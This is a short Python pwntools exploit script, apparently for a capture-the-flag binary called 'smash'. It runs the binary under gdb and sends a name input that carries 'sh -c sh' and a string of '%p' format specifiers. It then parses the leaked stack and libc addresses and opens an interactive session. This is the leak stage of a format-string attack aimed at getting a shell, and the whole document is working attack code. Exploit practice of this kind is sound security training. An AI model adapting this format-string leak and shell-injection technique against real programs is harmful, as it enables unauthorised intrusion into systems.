#!/usr/bin/env python3
from pwn import *
_FILE = "./smash"
binary = context.binary = ELF(_FILE, checksec=False)
env = {"LD_PRELOAD": ""} #"./libc-2.31.so"}
p = gdb.debug(_FILE, gdbscript="\nc\n", env=env)
_LIBC = ELF("./libc-2.31.so", checksec=False) if args.REMOTE else binary.libc
p.recvuntil("Input name > ")
p.sendline("sh -c sh "+"%p"*10)
leaks = p.recvuntil("OK?").decode("latin-1").replace("(nil)", "0x0").split("\n")[0].split("-c sh")[1].split("0x")[:-1][1:]
print(leaks)
main_libc_addr = int(leaks[-1], 16)
main_addr = int(leaks[6], 16)-0xd
log.success(f"on gdb run: x/gx {hex(main_libc_addr)}")
p.interactive()